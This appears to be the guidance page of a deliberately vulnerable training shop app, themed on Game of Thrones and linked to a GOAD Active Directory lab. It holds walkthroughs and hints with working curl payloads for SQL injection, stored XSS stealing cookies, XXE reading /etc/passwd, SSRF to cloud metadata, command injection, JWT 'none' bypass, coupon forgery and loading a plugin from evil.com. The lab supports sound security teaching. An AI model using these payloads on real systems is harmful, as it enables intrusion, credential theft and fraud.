🛒 Shop Exploitation Walkthroughs

        ▶
      

      


        

          
1

          

            
SQL Injection in Shop Search (A05)

            
Target: /portal/api/shop/items?search=

            
1. Go to the Shop tab and type ' OR '1'='1 in the search box.

               2. All items (including hidden/deleted ones) should appear.

               3. Try UNION-based extraction: ' UNION SELECT id,buyer,item_name,quantity,total_price,order_date,status,1 FROM shop_orders--

               4. Check the API Response Inspector (bottom-right) for raw JSON with FLAG.

            
curl -s "http://TARGET/portal/api/shop/items?search=' OR '1'='1"

          

        


        

          
2

          

            
IDOR — View Secret Items (A01)

            
Target: /portal/api/shop/items/{id}

            
1. Items 9 and 12 contain hidden FLAG values in their descriptions.

               2. Directly request /portal/api/shop/items/9 — the Braavosi Galeas has a secret.

               3. Try item IDs 100 and 101 for "deleted" products (like Juice Shop's Christmas Special).

               4. Also try /portal/api/wallet/balance?username=admin to see the admin's gold.

            
curl -s "http://TARGET/portal/api/shop/items/9" | python3 -m json.tool

          

        


        

          
3

          

            
Price Manipulation (A06)

            
Target: /portal/api/shop/purchase

            
1. Add expensive items to your cart (e.g. Faceless Men Assassination at 500,000 gold).

               2. Intercept the purchase request and change the total field to 1.

               3. The server logs the discrepancy but still processes the order.

            
curl -s -X POST http://TARGET/portal/api/shop/purchase \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","items":[{"item_id":24,"quantity":1}],"total":1}'

          

        


        

          
4

          

            
Stored XSS via Product Reviews (A05)

            
Target: /portal/api/shop/reviews/{item_id}

            
1. Open any product detail and scroll to "Write a Review".

               2. In the Comment field, enter: <img src=x onerror="alert('XSS')">

               3. Submit the review. The comment is stored unsanitized.

               4. Also try forging identity: set Author to daenerys.targaryen without being logged in.

            
curl -s -X POST http://TARGET/portal/api/shop/reviews/1 \
  -H 'Content-Type: application/json' \
  -d '{"author":"daenerys.targaryen","rating":1,"comment":"<script>alert(document.cookie)</script>"}'

          

        


        

          
5

          

            
Coupon Forgery — Weak Encoding (A04)

            
Target: /portal/api/shop/coupon/apply

            
1. Try known coupons: DRAGON10 (10%), VALAR50 (50%, expired but still works!).

               2. Visit /portal/api/shop/coupons/encode-sample to see encoding scheme.

               3. The format is base64 of SKPCOUPON|CODE|PERCENT|EXPIRY.

               4. Forge a 99% coupon: echo -n 'SKPCOUPON|HACKED|99|2099-12-31' | base64

               5. Apply the forged code to get near-free purchases.

            
# Generate forged 99% coupon
echo -n 'SKPCOUPON|HACKED|99|2099-12-31' | base64
# Apply it
curl -s -X POST http://TARGET/portal/api/shop/coupon/apply \
  -H 'Content-Type: application/json' \
  -d '{"code":"U0tQQ09VUE9OfEhBQ0tFRHw5OXwyMDk5LTEyLTMx"}'

          

        


        

          
6

          

            
Gold Wallet — Negative Transfer (A06)

            
Target: /portal/api/wallet/transfer

            
1. Check admin's wallet: /portal/api/wallet/balance?username=admin (IDOR).

               2. Transfer a negative amount: {"from":"admin","to":"guest","amount":-100000}

               3. The negative reverses the direction — you steal admin's gold!

               4. Also try race conditions: send 10 simultaneous transfers of the same amount.

            
curl -s -X POST http://TARGET/portal/api/wallet/transfer \
  -H 'Content-Type: application/json' \
  -d '{"from":"admin","to":"guest","amount":-100000}'

          

        


        

          
7

          

            
XXE — Trade Import (A02)

            
Target: /portal/api/trade/import

            
1. Craft an XML payload with an external entity referencing /etc/passwd.

               2. The parser resolves entities — file contents appear in the response.

               3. Also try SSRF via SYSTEM "http://169.254.169.254/" for cloud metadata.

            
curl -s -X POST http://TARGET/portal/api/trade/import \
  -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?>
<!DOCTYPE trade [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<trade><from>&xxe;</from><to>guest</to><item>gold</item></trade>'

          

        


        

          
8

          

            
Supply Chain — Malicious Plugin (A03:2025)

            
Target: /portal/api/shop/payment-plugin

            
1. The shop allows loading "payment gateway plugins" from any URL.

               2. No signature verification, no allow-list, no hash pinning.

               3. POST a URL to a malicious script — the server fetches and would execute it.

               4. Also check /portal/api/shop/dependencies to enumerate CVEs in pinned versions.

            
# Load malicious plugin (simulated)
curl -s -X POST http://TARGET/portal/api/shop/payment-plugin \
  -H 'Content-Type: application/json' \
  -d '{"plugin_url":"https://evil.com/malicious-gateway.py","plugin_name":"evil-pay"}'
# Enumerate vulnerable dependencies
curl -s http://TARGET/portal/api/shop/dependencies | python3 -m json.tool

          

        


        

          
9

          

            
Verbose Error Disclosure (A10:2025)

            
Target: /portal/api/shop/items/{id}/debug

            
1. Request a non-existent item: /portal/api/shop/items/99999/debug

               2. The error response leaks stack traces, DB credentials, JWT secret hints, and server paths.

               3. Also try /portal/api/shop/bulk-purchase with quantity: 0 — triggers ZeroDivisionError with internal details.

            
# Trigger verbose error disclosure
curl -s http://TARGET/portal/api/shop/items/99999/debug | python3 -m json.tool
# Trigger zero-division exception
curl -s -X POST http://TARGET/portal/api/shop/bulk-purchase \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","items":[{"item_id":1,"quantity":0}]}'

          

        


        

          
10

          

            
Checkout PCI Violation (A04 + A09)

            
Target: /portal/api/shop/checkout

            
1. Add items to cart and proceed to checkout with a credit card.

               2. The full CC number, CVV, and cardholder name are logged in OpenTelemetry spans.

               3. This violates PCI-DSS — card data must never be stored or logged in plaintext.

               4. Check APM Traces tab to see the payment.card_full attribute in spans.

            
curl -s -X POST http://TARGET/portal/api/shop/checkout \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","cc_number":"4111111111111111","cc_expiry":"12/28","cc_cvv":"123","cc_name":"Jon Snow","total":100}'

🛠 Pentest Methodology

        ▶
      

      

        

          
1

          

            
Reconnaissance

            
Explore the application. Check /portal/api/debug/env and /portal/api/debug/crypto for information leaks. Hit /portal/api/shop/dependencies to enumerate vulnerable packages. Test /portal/api/goad/connectivity to understand the network topology.

          

        

        

          
2

          

            
Authentication Attacks

            
Try default credentials (admin/admin). Brute force with common passwords. Examine the JWT structure — the secret may be weak. Try the "none" algorithm bypass on /portal/api/admin/panel. Check security questions at /portal/api/auth/security-question?username=jon.snow for OSINT-guessable answers.

          

        

        

          
3

          

            
Injection Testing

            
Test every input: SQL injection in Treasury search and Shop search, LDAP injection in user lookup, command injection in System Console, SSTI in Template Renderer, stored XSS in product reviews, XXE in trade import.

          

        

        

          
4

          

            
Access Control & Business Logic

            
Test IDOR by changing user IDs, item IDs, and usernames in cart/wallet/orders. Try path traversal. Exploit price manipulation and negative wallet transfers. Forge coupons using the base64 encoding scheme.

          

        

        

          
5

          

            
Server-Side & Supply Chain

            
Use SSRF to reach cloud metadata (169.254.169.254) and GOAD VMs (192.168.56.x). Load a malicious payment plugin via /portal/api/shop/payment-plugin. Test deserialization via Data Import.

          

        

        

          
6

          

            
Error Exploitation

            
Trigger verbose errors via /portal/api/shop/items/99999/debug to leak DB credentials and JWT secrets. Send quantity: 0 to /portal/api/shop/bulk-purchase to trigger ZeroDivisionError with internal state disclosure.

          

        

        

          
7

          

            
GOAD Integration

            
If GOAD Active Directory is reachable, test SQL injection against Castle Black MSSQL. Try LDAP auth against the three domain controllers. The shop search and order history endpoints connect to GOAD MSSQL for real database exploitation. Use the ADCS forms to enumerate vulnerable certificate templates (ESC1, ESC4, ESC6-8) and simulate certificate-based privilege escalation.

          

        

      

    


    
    

      

        
💡 Vulnerability Hints

        ▶
      

      

        

          

            
Authentication Bypass

            
Try admin / admin. Also: the JWT secret is very short. Security questions have GoT-trivia answers (e.g. ghost, drogon).

          

          

            
SQL Injection

            
Treasury search: ' OR 1=1--
Shop search: ' UNION SELECT * FROM shop_orders--
Order history: username = ' OR 1=1--

          

          

            
Shop — Price & Coupons

            
Purchase with {"total":1} to override price.
Forge coupon: echo -n 'SKPCOUPON|HACK|99|2099-12-31' | base64
Expired VALAR50 still works!

          

          

            
Shop — IDOR & Wallet

            
Items 9, 12 have flags. Try IDs 100-101 for deleted items.
Wallet: ?username=admin shows 999,999 gold.
Negative transfer: amount: -100000 steals gold.

          

          

            
Supply Chain (A03:2025)

            
POST to /api/shop/payment-plugin with any URL — no integrity check.
/api/shop/dependencies leaks all package versions + known CVEs.

          

          

            
Error Disclosure (A10:2025)

            
/api/shop/items/99999/debug leaks stack trace, DB creds, JWT secret.
Bulk purchase with quantity: 0 causes ZeroDivisionError with internals.

          

          

            
XSS & Reviews

            
Reviews: <img src=x onerror=alert(1)>
Messages: <script>alert('XSS')</script>
Author field accepts any name — impersonate anyone.

          

          

            
Path Traversal

            
Try ../../../etc/passwd in File Manager. The app doesn't sanitize ../ sequences.

          

          

            
Command Injection

            
System Console: hostname; whoami or hostname | cat /etc/passwd

          

          

            
SSRF & XXE

            
Avatar: http://169.254.169.254/latest/meta-data/
XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd"> in trade import.

          

          

            
JWT & CSRF

            
JWT: change alg to none, set role: admin, remove signature.
CSRF: /api/users/change-allegiance has no token check.

          

          

            
Deserialization

            
Import Profile: base64-encode a Python pickle payload with __reduce__ method.
